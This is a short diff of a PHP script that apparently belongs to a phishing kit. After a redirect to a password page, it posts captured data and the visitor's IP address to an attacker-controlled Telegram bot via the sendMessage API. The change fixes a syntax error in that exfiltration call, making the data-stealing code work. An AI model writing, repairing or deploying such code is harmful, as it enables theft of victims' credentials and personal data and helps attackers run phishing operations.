@@ -67,7 +67,7 @@ header("Location: password.php");
         $website = "https://api.telegram.org/bot" . $telegram_BOT_zoolander;
         $params = [
             'chat_id' => $telegram_Chat_ID,
-            'text' => $zoolanderzoolanderzoolanderzoolanderzoolander . "<br>" echo $ip,
+            'text' => $zoolanderzoolanderzoolanderzoolanderzoolander . "<br>" . $ip,
         ];
         $ch = curl_init($website . '/sendMessage');
         curl_setopt($ch, CURLOPT_HEADER, false);
